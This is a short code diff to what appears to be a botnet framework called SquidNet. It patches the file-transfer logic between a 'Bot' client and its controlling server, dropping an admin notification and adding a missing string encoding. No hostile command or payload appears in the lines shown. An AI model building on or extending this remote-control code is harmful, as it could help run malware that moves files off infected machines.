@@ -764,7 +764,6 @@ class SquidNet:
                                             else:
                                                 try:
                                                     if msg == "!stopwrite":
-                                                        self.send_to_other(name,self.admin_username,"File transfer to server completed.", self.adminconn)
                                                         self.downloading = False
                                                         self.botdownload.close()
                                                     else:
@@ -5358,7 +5357,7 @@ class Bot:
                             else:
                                 self.client.send(sendto)
                         time.sleep(5)
-                        self.client.send(f"!stopwrite")
+                        self.client.send(f"!stopwrite".encode())
                         time.sleep(1)
                         self.client.send("File transfer to server completed.".encode())
                     except:
